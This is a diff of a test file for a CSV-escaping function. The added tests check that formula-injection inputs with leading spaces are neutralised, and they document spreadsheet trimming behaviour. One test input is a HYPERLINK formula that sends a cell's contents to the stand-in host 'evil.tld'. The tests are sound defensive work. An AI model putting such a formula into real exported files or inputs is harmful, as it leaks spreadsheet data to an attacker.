@@ -28,6 +28,21 @@ check('@ vira texto', escapeCsvValue('@SUM(A1)'), "'@SUM(A1)")
 check('tab vira texto', escapeCsvValue('\t=1+1'), "'\t=1+1")
 check('CR é neutralizado e citado', escapeCsvValue('\r=1+1'), '"\'\r=1+1"')
 
+console.log('\n--- Fórmula precedida de espaço (trim antes de avaliar) ---')
+// LibreOffice e algumas configurações de importação do Excel fazem trim da
+// célula ANTES de avaliar, então espaço à esquerda não protege.
+check('espaço + igual', escapeCsvValue(' =1+1'), "' =1+1")
+check('múltiplos espaços + igual', escapeCsvValue('   =1+1'), "'   =1+1")
+check('espaço + arroba', escapeCsvValue(' @SUM(A1)'), "' @SUM(A1)")
+check('espaço + mais', escapeCsvValue(' +1+1'), "' +1+1")
+check('espaço + menos', escapeCsvValue(' -1+1'), "' -1+1")
+check(
+  'espaço + HYPERLINK vindo de webhook',
+  escapeCsvValue(' =HYPERLINK("https://evil.tld/?d="&A1,"Clique")'),
+  '"\' =HYPERLINK(""https://evil.tld/?d=""&A1,""Clique"")"',
+)
+check('texto legítimo com espaço não é alterado', escapeCsvValue(' João Silva'), ' João Silva')
+
 console.log('\n--- Payload real do relatório de auditoria ---')
 check(
   'HYPERLINK exfiltrando célula',
